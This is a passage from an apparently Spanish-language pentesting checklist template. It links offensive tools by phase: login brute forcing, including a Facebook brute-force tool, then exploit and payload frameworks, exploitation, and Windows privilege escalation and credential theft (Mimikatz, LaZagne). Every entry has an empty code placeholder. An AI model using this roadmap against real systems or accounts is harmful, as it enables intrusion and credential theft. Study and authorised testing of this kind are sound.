*   [ ] P4Iwordlists👈 --------------------------------->[https://paimonhacking.gitbook.io/p4im0n\_h4cking/curso-hacking-con-python/generador-de-wordlist-para-fuerza-bruta-p4iwordlist.py-1.2v](https://paimonhacking.gitbook.io/p4im0n\_h4cking/curso-hacking-con-python/generador-de-wordlist-para-fuerza-bruta-p4iwordlist.py-1.2v)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CYBERCHEF👈 --------------------------------->[https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CYBERCHEF👈 --------------------------------->[https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CYBERCHEF👈 --------------------------------->[https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] BASE64 DECODE👈 --------------------------------->[https://www.base64decode.org/](https://www.base64decode.org/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] BASE64 DECODE👈 --------------------------------->[https://www.base64decode.org/](https://www.base64decode.org/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:

***

***

</details>

🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨



<details>

<summary>💪 FUERZA BRUTA A LOGINS ❌</summary>

### FUERZA BRUTA A LOGINS

*   [ ] HYDRA👈 --------------------------------->[https://www.kali.org/tools/hydra/ ](https://www.kali.org/tools/hydra/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/hydra-fuerza-bruta)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HYDRA👈 --------------------------------->[https://www.kali.org/tools/hydra/ ](https://www.kali.org/tools/hydra/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/hydra-fuerza-bruta)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HYDRA👈 --------------------------------->[https://www.kali.org/tools/hydra/ ](https://www.kali.org/tools/hydra/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/hydra-fuerza-bruta)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] MEDUSA👈 --------------------------------->[https://www.kali.org/tools/medusa/ ](https://www.kali.org/tools/medusa/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/medusa)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] MEDUSA👈 --------------------------------->[https://www.kali.org/tools/medusa/ ](https://www.kali.org/tools/medusa/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/medusa)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] MEDUSA👈 --------------------------------->[https://www.kali.org/tools/medusa/ ](https://www.kali.org/tools/medusa/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/medusa)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NCRACK👈 --------------------------------->[https://www.kali.org/tools/ncrack/](https://www.kali.org/tools/ncrack/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] 161 ONESIXTYONE👈 --------------------------------->[https://www.kali.org/tools/onesixtyone/](https://www.kali.org/tools/onesixtyone/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] THC-PPTP-BRUTER👈 --------------------------------->[https://www.kali.org/tools/thc-pptp-bruter/](https://www.kali.org/tools/thc-pptp-bruter/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CRACKMAPEXEC👈 --------------------------------->[https://www.kali.org/tools/crackmapexec/](https://www.kali.org/tools/crackmapexec/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CROWBAR RDP👈 --------------------------------->[https://www.kali.org/tools/crowbar/](https://www.kali.org/tools/crowbar/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] THE CRACKER PDF,ZIP,RAR,LOGIN👈 --------------------------------->[https://github.com/XDeadHackerX/The\_Cracker](https://github.com/XDeadHackerX/The\_Cracker)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] THC-HYDRA👈 --------------------------------->[https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] THC-HYDRA👈 --------------------------------->[https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] T14M4T scaneo de servicios en puertos y fuerza bruta automatizado👈 --------------------------------->[https://github.com/MS-WEB-BN/t14m4t](https://github.com/MS-WEB-BN/t14m4t)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] FACEBOOK-BRUTE-FORCE👈 --------------------------------->[https://github.com/likhonsible/Facebook-Brute-Force](https://github.com/likhonsible/Facebook-Brute-Force)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:

***

***

</details>

🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧



<details>

<summary>🛠️ SCRIPT DE EXPLOIT Y PAYLOADS ❌</summary>

### SCRIPT DE EXPLOIT Y PAYLOADS

*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SEARCHSPLOIT👈 --------------------------------->[https://www.kali.org/tools/exploitdb/](https://www.kali.org/tools/exploitdb/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] EXPLOITDB👈 --------------------------------->[https://www.exploit-db.com/](https://www.exploit-db.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] GITHUB SEARCH👈 --------------------------------->[https://github.com/search](https://github.com/search)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] AWESOMEHACKING👈 --------------------------------->[https://awesomehacking.org/](https://awesomehacking.org/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NVD VULNERABILITIES BASE👈 --------------------------------->[https://nvd.nist.gov/vuln](https://nvd.nist.gov/vuln)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] MSFVENOM PAYLOAD👈 --------------------------------->[https://www.kali.org/tools/metasploit-framework/ ](https://www.kali.org/tools/metasploit-framework/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/msfvenom-generador-de-payloads)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] MSFPC PAYLOAD👈 --------------------------------->[https://www.kali.org/tools/msfpc/](https://www.kali.org/tools/msfpc/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] RAPID7 vulnerabilidades y exploits👈 --------------------------------->[https://www.rapid7.com/db/](https://www.rapid7.com/db/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HACKTRICKS👈 --------------------------------->[https://book.hacktricks.xyz/v/es/welcome/readme](https://book.hacktricks.xyz/v/es/welcome/readme)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HACKTOOL👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HACKTOOL👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:

***

***

</details>

🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥



<details>

<summary>🤯 EXPLOTACION ❌</summary>

### EXPLOTACION

*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/57/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/57/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/57/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SQLMAP👈 --------------------------------->[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/sqlmap)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SQLMAP👈 --------------------------------->[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/sqlmap)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SQLMAP👈 --------------------------------->[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/sqlmap)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CRACKMAPEXEC👈 --------------------------------->[https://www.kali.org/tools/crackmapexec/](https://www.kali.org/tools/crackmapexec/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CRACKMAPEXEC👈 --------------------------------->[https://www.kali.org/tools/crackmapexec/](https://www.kali.org/tools/crackmapexec/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] VELO👈 --------------------------------->[https://github.com/Veil-Framework/Veil](https://github.com/Veil-Framework/Veil)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WEB2ATTACK👈 --------------------------------->[https://github.com/santatic/web2attack](https://github.com/santatic/web2attack)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMMIX👈 --------------------------------->[https://www.kali.org/tools/commix/](https://www.kali.org/tools/commix/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WEBSPLOIT👈 --------------------------------->[https://github.com/The404Hacking/websploit](https://github.com/The404Hacking/websploit)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] BEEF FRAMEWORK EXPLOTACION👈--------------------------------->[https://www.kali.org/tools/beef-xss/](https://www.kali.org/tools/beef-xss/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HACKTRICKS👈 --------------------------------->[https://book.hacktricks.xyz/v/es/welcome/readme](https://book.hacktricks.xyz/v/es/welcome/readme)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:

***

***

</details>

⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔



<details>

<summary>💠 ESCALADA DE PRIVILEGIOS WINDOWS ❌</summary>

### ESCALADA DE PRIVILEGIOS WINDOWS

*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/57/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/57/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/57/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] POWERUP👈 --------------------------------->[https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] LaZagne👈 --------------------------------->[https://github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/47/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/lazagne-obtencion-de-credenciales-y-posibles-escaladas-de-privilegios-para-windows-y-linux)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] MIMIKATZ👈 --------------------------------->[https://www.kali.org/tools/mimikatz/ ](https://www.kali.org/tools/mimikatz/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/47/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/mimikatz-obtencion-de-credenciales-y-posibles-escaladas-de-privilegios-para-windows)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] ROTTENPOTATO👈 --------------------------------->[https://github.com/breenmachine/RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WINDOWS EXPLOITS SUGGESTER👈 --------------------------------->[https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] ACCESSCHK👈 --------------------------------->[https://github.com/ankh2054/windows-pentest](https://github.com/ankh2054/windows-pentest)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] PSEXEC👈 --------------------------------->[https://learn.microsoft.com/en-us/sysinternals/downloads/psexec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WINPEAS👈 --------------------------------->[https://www.kali.org/tools/peass-ng/ ](https://www.kali.org/tools/peass-ng/)--->[https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] BLOODHOUND --------------------------------->[https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CRACKMAPEXEC --------------------------------->[https://www.kali.org/tools/crackmapexec/](https://www.kali.org/tools/crackmapexec/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] EMPIRE POWERSHELL Y LINUX👈 --------------------------------->[https://www.kali.org/tools/powershell-empire/ ](https://www.kali.org/tools/powershell-empire/)-->[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] RESPONDER👈 --------------------------------->[https://www.kali.org/tools/responder/ ](https://www.kali.org/tools/responder/)-->[https://github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] LOLBAS👈 --------------------------------->[https://lolbas-project.github.io/#](https://lolbas-project.github.io)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WADCOMS comandos👈 --------------------------------->[https://wadcoms.github.io/](https://wadcoms.github.io/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HIJACKLIBS DLL👈 --------------------------------->[https://hijacklibs.net/](https://hijacklibs.net/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] PRINTSPOOFER👈 --------------------------------->[https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] ROGUEWINRM👈 --------------------------------->[https://github.com/antonioCoco/RogueWinRM](https://github.com/antonioCoco/RogueWinRM)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WINDOWSPRIVESC metodos👈 --------------------------------->[https://github.com/debiantano/WindowsPrivesc](https://github.com/debiantano/WindowsPrivesc)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] PRIV-ESCALATION metodos👈 --------------------------------->[https://github.com/KevinLiebergen/priv-escalation](https://github.com/KevinLiebergen/priv-escalation)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] FILESEC GTFO win y linux👈 --------------------------------->[https://filesec.io/](https://filesec.io/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HACKTRICKS👈 --------------------------------->[https://book.hacktricks.xyz/v/es/welcome/readme](https://book.hacktricks.xyz/v/es/welcome/readme)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] POWERSPLOIT👈 --------------------------------->[https://www.kali.org/tools/powersploit/](https://www.kali.org/tools/powersploit/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] EVIL-WINRM👈 --------------------------------->[https://www.kali.org/tools/evil-winrm/](https://www.kali.org/tools/evil-winrm/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
